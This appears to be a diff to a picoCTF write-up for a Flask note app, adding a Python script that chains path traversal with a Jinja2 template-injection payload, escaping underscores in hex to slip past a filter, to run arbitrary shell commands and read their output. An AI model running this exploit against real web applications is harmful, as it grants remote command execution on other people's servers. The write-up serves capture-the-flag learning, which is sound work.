@@ -51,7 +51,7 @@ chmod 1773 templates/errors
 
 the "Others" permission is `3 = Write + Execute, NO Read` — so to go to `../index.html` it first needs to list the files in `/templates/errors` on which it has no listing permission
 
-also even when we try to put server side templates in our html files, it would not execute as the files are stored in `static/` dir. templates only execute in the templates dir
+also even when we try to put server side templates in our html files, it was not executing as the files are stored in `static/` dir. Templates only execute when placed in the templates directory as by default, flask only looks for templates in the templates/ directory
 
 ---
 
@@ -71,7 +71,7 @@ and doing it in the main picoctf CTF webapp also worked when we wrote our file t
 
 ## exploitation
 
-the send payload through content → copy file path → use error param to access it flow was very lengthy so i made a python script to automate it
+First send payload through content → copy file path → use error param to access it. The exploit flow was very lengthy so i made a python script to automate it (provided at the end)
 
 searched for jinja2 file read payloads without `_` and `/` as they were blocked and found one that worked:
 
@@ -90,5 +90,36 @@ then executing `cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt` using the sam
 ```
 picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
 ```
+## Python exploit
+```python
+#!/usr/bin/env python3
+import requests
+import argparse
+import re
 
+parser = argparse.ArgumentParser(description='SSTI exploit')
+parser.add_argument('-u', '--url', required=True, help='Target URL')
+parser.add_argument('-c', '--command', required=True, help='Command to execute')
+args = parser.parse_args()
+
+url = args.url.rstrip('/')
+command = args.command
+
+content = f"..\\templates\\errors\\{'A'*128}{{{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('{command}')['read']()}}}}"
+
+print(f"[*] Sending payload...")
+r = requests.post(f"{url}/new", data={"content": content})
+
+redirected_url = r.url
+if 'errors/' in redirected_url:
+    file_name = redirected_url.split('errors/')[1].split('.html')[0]
+    print(f"[+] Triggering exploit...")
+    r2 = requests.get(f"{url}/", params={"error": file_name})
+    
+    clean = re.sub(r'<[^>]+>', '\n', r2.text)
+    lines = [l.strip() for l in clean.split('\n') if l.strip() and 'error:' not in l and 'make a new note' not in l]
+    print("\n" + "\n".join(lines))
+else:
+    print("[-] Failed to trigger exploit")
+```
 ---
